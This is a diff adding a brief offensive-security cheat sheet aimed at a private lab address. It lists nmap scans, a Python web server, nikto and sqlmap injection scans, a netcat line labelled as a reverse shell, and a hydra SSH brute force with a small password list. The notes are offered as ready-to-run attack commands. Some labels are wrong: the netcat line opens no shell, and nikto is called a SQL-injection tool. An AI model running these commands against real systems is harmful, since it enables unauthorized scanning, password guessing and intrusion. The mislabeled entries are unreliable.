@@ -1,0 +1,23 @@
+nmap aggressive scan: sudo nmap -A 192.168.56.1
+nmap udp scan: sudo nmap -sU 192.168.56.1
+
+
+make a web server: python -m http.server 80 in a admin cmd
+nkito web application attack [sql injection] : nikto -h 192.168.56.1 -Tuning 9
+
+another sql injection: sqlmap -u "http://192.168.56.1/?id=1"
+
+reverse shell attack:
+echo "uid=0(root)" | nc 192.168.56.1 80
+
+
+brute force:
+
+echo "password123" > pass.txt
+echo "admin" >> pass.txt
+echo "123456" >> pass.txt
+
+hydra -l admin -P pass.txt ssh://192.168.56.1
+
+
+
